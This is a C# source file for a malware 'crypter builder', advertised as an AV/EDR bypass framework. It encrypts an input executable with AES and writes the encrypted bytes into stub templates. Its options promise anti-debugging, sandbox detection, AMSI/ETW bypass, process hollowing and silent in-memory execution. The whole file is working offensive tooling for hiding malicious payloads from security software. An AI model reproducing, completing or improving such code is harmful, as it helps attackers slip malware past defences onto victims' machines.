using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;

namespace CrypterBuilder
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("╔═══════════════════════════════════════════════╗");
            Console.WriteLine("║   🔐 PE/ELF Crypter Builder v3.0 (C#)       ║");
            Console.WriteLine("║   Advanced AV/EDR Bypass Framework            ║");
            Console.WriteLine("╚═══════════════════════════════════════════════╝\n");

            if (args.Length < 4)
            {
                PrintUsage();
                return;
            }

            string inputFile = null;
            string password = null;
            string outputFile = null;
            bool advanced = false;
            bool dotnet = false;
            bool stealth = false;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-in":
                        inputFile = args[++i];
                        break;
                    case "-password":
                        password = args[++i];
                        break;
                    case "-out":
                        outputFile = args[++i];
                        break;
                    case "-advanced":
                        advanced = true;
                        break;
                    case "-dotnet":
                        dotnet = true;
                        break;
                    case "-stealth":
                        stealth = true;
                        break;
                }
            }

            if (string.IsNullOrEmpty(inputFile) || string.IsNullOrEmpty(password))
            {
                PrintUsage();
                return;
            }

            if (string.IsNullOrEmpty(outputFile))
            {
                outputFile = "crypted_" + Path.GetFileName(inputFile);
            }

            Console.WriteLine($"[*] Input: {inputFile}");
            Console.WriteLine($"[*] Output: {outputFile}");
            
            if (stealth)
                Console.WriteLine("[*] Mode: STEALTH (minimal approach)");
            else if (dotnet)
                Console.WriteLine("[*] Mode: DOTNET (AMSI/ETW bypass)");
            else if (advanced)
                Console.WriteLine("[*] Mode: ADVANCED");
            else
                Console.WriteLine("[*] Mode: BASIC");

            try
            {
                byte[] payload = File.ReadAllBytes(inputFile);
                Console.WriteLine($"[+] Payload size: {payload.Length} bytes");

                byte[] key = DeriveKey(password);
                Console.WriteLine("[+] Encryption key generated");

                byte[] encrypted = Encrypt(payload, key);
                Console.WriteLine($"[+] Encrypted size: {encrypted.Length} bytes");

                string stubTemplate = SelectStub(stealth, dotnet, advanced);
                string stub = File.ReadAllText(stubTemplate);

                stub = ReplacePayload(stub, encrypted);
                stub = ReplaceKey(stub, key);
                stub = ReplaceJunk(stub);

                string outputPath = Path.Combine(Directory.GetCurrentDirectory(), outputFile);
                File.WriteAllText(outputPath, stub);

                Console.WriteLine("\n==================================================");
                Console.WriteLine("[+] SUCCESS! Crypted stub created");
                Console.WriteLine("==================================================");
                Console.WriteLine($"[+] Output: {outputPath}");
                Console.WriteLine($"[+] Size: {new FileInfo(outputPath).Length} bytes");
                
                if (stealth)
                {
                    Console.WriteLine("\n[*] Stealth mode (2026 - minimal):");
                    Console.WriteLine("    ✓ VirtualAlloc + CreateThread only");
                    Console.WriteLine("    ✓ No Process Hollowing");
                    Console.WriteLine("    ✓ Silent execution");
                }

                Console.WriteLine($"\n[*] Compile: csc /target:exe /out:{outputFile.Replace(".cs", ".exe")} {outputFile}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        static void PrintUsage()
        {
            Console.WriteLine("Usage: Builder.exe -in <input.exe> -password <password> [-out <output.cs>] [-advanced] [-dotnet] [-stealth]");
            Console.WriteLine("\nOptions:");
            Console.WriteLine("  -advanced    Enable anti-debug, sandbox detection");
            Console.WriteLine("  -dotnet      Enable AMSI/ETW bypass, Process Hollowing");
            Console.WriteLine("  -stealth     Enable stealth mode (minimal approach)");
        }

        static byte[] DeriveKey(string password)
        {
            using (var sha256 = SHA256.Create())
            {
                return sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
            }
        }

        static byte[] Encrypt(byte[] data, byte[] key)
        {
            using (var aes = new AesManaged())
            {
                aes.Key = key;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.GenerateIV();

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, aes.IV.Length);
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

        static string SelectStub(bool stealth, bool dotnet, bool advanced)
        {
            if (stealth)
                return "Stubs/StubStealth.cs";
            else if (dotnet)
                return "Stubs/StubDotNet.cs";
            else if (advanced)
                return "Stubs/StubAdvanced.cs";
            else
                return "Stubs/StubBasic.cs";
        }

        static string ReplacePayload(string stub, byte[] payload)
        {
            string payloadStr = "new byte[] { " + string.Join(", ", payload.Select(b => $"0x{b:X2}")) + " }";
            return stub.Replace("/* PAYLOAD_PLACEHOLDER */", payloadStr);
        }

        static string ReplaceKey(string stub, byte[] key)
        {
            string keyStr = "new byte[] { " + string.Join(", ", key.Select(b => $"0x{b:X2}")) + " }";
            return stub.Replace("/* KEY_PLACEHOLDER */", keyStr);
        }

        static string ReplaceJunk(string stub)
        {
            var random = new Random();
            string junk = $"// Generated: {DateTime.Now}\n// Random: {random.Next(10000, 99999)}";
            return stub.Replace("/* JUNK_PLACEHOLDER */", junk);
        }
    }
}
